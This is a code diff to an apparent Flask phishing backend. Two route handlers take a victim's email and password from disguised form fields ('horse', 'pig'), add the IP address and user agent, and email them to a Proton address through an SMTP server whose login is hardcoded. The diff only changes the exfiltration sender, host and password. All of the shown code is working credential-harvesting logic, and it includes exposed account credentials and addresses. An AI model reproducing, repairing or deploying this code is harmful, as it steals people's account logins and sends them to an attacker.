@@ -143,9 +143,9 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logs@merusllc.com"
+        sender_email = "charlesgraham@lonparks.online"
         receiver_email = "danielojerahi@proton.me"
-        password = "MLpkqf25fxet"
+        password = "N.-hSKRsYPrK"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW KOREA API ... 1"
@@ -161,7 +161,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("mail.merusllc.com", 587) as server:
+        with smtplib.SMTP("mail.lonparks.online", 587) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -180,9 +180,9 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logs@merusllc.com"
+        sender_email = "charlesgraham@lonparks.online"
         receiver_email = "danielojerahi@proton.me"
-        password = "MLpkqf25fxet"
+        password = "N.-hSKRsYPrK"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW KOREA API ... 2"
@@ -198,7 +198,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("mail.merusllc.com", 587) as server:
+        with smtplib.SMTP("mail.lonparks.online", 587) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
